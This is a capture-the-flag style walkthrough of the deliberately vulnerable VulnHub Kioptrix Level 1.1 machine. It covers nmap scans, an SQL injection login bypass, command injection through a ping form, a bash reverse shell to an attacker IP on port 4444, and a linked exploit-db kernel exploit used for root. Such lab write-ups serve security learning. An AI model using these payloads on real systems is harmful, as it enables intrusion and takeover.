<h1>KIOPTRIX: LEVEL 1.1</h1>

Today, we'll be looking at the Kioptrix level 2 machine on vulnhub.

You can download the machine [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).

Let's scan the machine with nmap.
```
┌──(root㉿kali)-[~]
└─# nmap 192.168.1.111   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 10:36 EET
Nmap scan report for 192.168.1.111
Host is up (0.040s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
3306/tcp open  mysql
MAC Address: B0:A4:60:CC:CC:61 (Intel Corporate)

Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
```
Browsing the machine on port 80, we have a login page.

Let's try to bypass that with sql injection.

We'll use this as the username: ```admin 'OR 1=1-- -```

And use any password you want.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix2/pics/pic1.png)

We got in!

Now, we got into this page that uses the ping command and looks like it might be 
vulnerable to command injection.

Let's try that to run the command ```id```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix2/pics/pic3.png)

It worked!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix2/pics/pic4.png)

Now, let's use that to open a reverse shell.

First let's set up a netcat listner.

Then, we can use this command to open a reverse shell

Here's a cheat sheet with multiple reverse shells: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>

```192.168.1.111; bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1```

We got a shell!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix2/pics/pic5.png)

I ran a os detection scan with nmap to determine the version of linux running on the machine.

```
┌──(root㉿kali)-[~]
└─# nmap -O 192.168.1.111
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 14:08 EET
Nmap scan report for 192.168.1.111
Host is up (0.00025s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
3306/tcp open  mysql
MAC Address: B0:A4:60:CC:CC:61 (Intel Corporate)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```
We can see that it's running **Linux 2.6.9**.

We can use this exploit form exploitdb: <https://www.exploit-db.com/exploits/9542>

I downloaded the exploit and copied it to the target machine using python http server.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix2/pics/pic6.png)

Now, let's compile the c file and run it.

```gcc 9542.c -o shell```

Now, let's run it.

We became root!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix2/pics/pic7.png)